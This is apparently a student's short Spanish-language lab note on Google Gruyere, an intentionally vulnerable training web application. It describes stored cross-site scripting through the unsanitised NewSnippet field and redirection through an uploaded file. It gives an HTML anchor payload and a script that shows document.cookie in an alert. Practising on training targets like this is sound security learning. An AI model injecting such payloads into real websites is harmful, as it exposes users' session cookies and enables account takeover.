# Gruyere

**NewSnippet:**
Podemos incluir **html** en el texto, no verifican que es lo que mandamos, así que se puede inyectar código.

**Inyectar script:**
Podemos inyectar un scrip gracias a subir un archivo en la página de *Upload*, y inyectarlo en *NewSnippeet" gracias a un enlace de html, asi redirigimos al usuario a dónde queremos.

```html
<a href=https://google-gruyere.appspot.com/472589290819737327883715591882447057975/hola/gruyere.html></a>
```

Podemos obtener su ID gracias a las cookies y ponerlo en un alert de **js**.

```js
<script>
    alert(document.cookie)
</script>
```